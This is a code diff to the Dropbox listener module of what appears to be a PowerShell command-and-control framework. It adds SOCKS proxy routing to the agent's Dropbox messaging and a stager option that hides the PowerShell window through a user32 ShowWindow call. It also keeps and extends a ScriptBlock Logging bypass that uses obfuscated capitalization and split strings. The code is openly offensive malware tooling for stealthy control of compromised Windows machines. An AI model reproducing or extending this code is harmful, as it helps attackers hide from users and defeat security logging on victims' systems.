@@ -111,7 +111,17 @@ class Listener:
                 'Description'   :   'Hours for the agent to operate (09:00-17:00).',
                 'Required'      :   False,
                 'Value'         :   ''
-            }
+            },
+            'SocksAddress' : {
+                'Description'   :   'Address the SOCKS Proxy is bound to.',
+                'Required'      :   False,
+                'Value'         :   ''
+            },
+            'SocksPort' : {
+                'Description'   :   'Port the SOCKS Proxy listens on.',
+                'Required'      :   False,
+                'Value'         :   ''
+            },
         }
 
         # required:
@@ -146,7 +156,7 @@ class Listener:
         return True
 
 
-    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None):
+    def generate_launcher(self, useWindowHandler='False', encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None):
         """
         Generate a basic launcher for the specified listener.
         """
@@ -174,9 +184,25 @@ class Listener:
                 # PowerShell
 
                 stager = ''
+
+ 		if useWindowHandler.lower()=='true':
+ 			#Don't hide the window via parameter. Hide via WindowHandler.
+ 			stager += "$t = '[DllImport("
+ 			stager += helpers.randomize_capitalization('"user32.dll"')
+ 			stager += ")] public static extern bool ShowWindow"
+ 			stager += "(int handle, int state);'; "
+ 			stager += helpers.randomize_capitalization("add-type -name win -member $t -namespace native;")
+ 			stager += " [native.win]::"
+ 			stager += "ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() "
+ 			stager += "| Get-Process).MainWindowHandle, 0);"
+ 			#Remove WindowsStyle parameter from launcher command
+ 			hideCmd = [" -w 1 "," -W 1 "," -W hidden "," -w hidden "," -w Hidden "]
+ 			for cmd in hideCmd:
+ 				launcher = launcher.replace(cmd," ")
+
                 if safeChecks.lower() == 'true':
                     # ScriptBlock Logging bypass
-                    stager = helpers.randomize_capitalization("$GroupPolicySettings = [ref].Assembly.GetType(")
+                    stager += helpers.randomize_capitalization("$GroupPolicySettings = [ref].Assembly.GetType(")
                     stager += "'System.Management.Automation.Utils'"
                     stager += helpers.randomize_capitalization(").\"GetFie`ld\"(")
                     stager += "'cachedGroupPolicySettings', 'N'+'onPublic,Static'"
@@ -516,6 +542,7 @@ class Listener:
         taskingsFolder = "/%s/%s" % (baseFolder, listenerOptions['TaskingsFolder']['Value'].strip('/'))
         resultsFolder = "/%s/%s" % (baseFolder, listenerOptions['ResultsFolder']['Value'].strip('/'))
 
+
         if language:
             if language.lower() == 'powershell':
 
@@ -799,6 +826,19 @@ def send_message(packets=None):
         stagingFolder = "/%s/%s" % (baseFolder, listenerOptions['StagingFolder']['Value'].strip('/'))
         taskingsFolder = "/%s/%s" % (baseFolder, listenerOptions['TaskingsFolder']['Value'].strip('/'))
         resultsFolder = "/%s/%s" % (baseFolder, listenerOptions['ResultsFolder']['Value'].strip('/'))
+        socksAddr = listenerOptions['SocksAddress']['Value']
+        socksPort = listenerOptions['SocksPort']['Value']
+        if socksAddr!='':
+                if socksPort!='':
+                        import socks
+                        import socket
+                        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, socksAddr, int(socksPort))
+                        socket.socket = socks.socksocket
+                        #><>Magic*~*!*+*zzZ) FIX FOR DNS LEAKING
+                        def getaddrinfo(*args):
+                                return [(socket.AF_INET, socket.SOCK_STREAM, 6, '', (args[0], args[1]))]
+                        socket.getaddrinfo = getaddrinfo
+                        reload(dropbox)
 
         dbx = dropbox.Dropbox(apiToken)
 
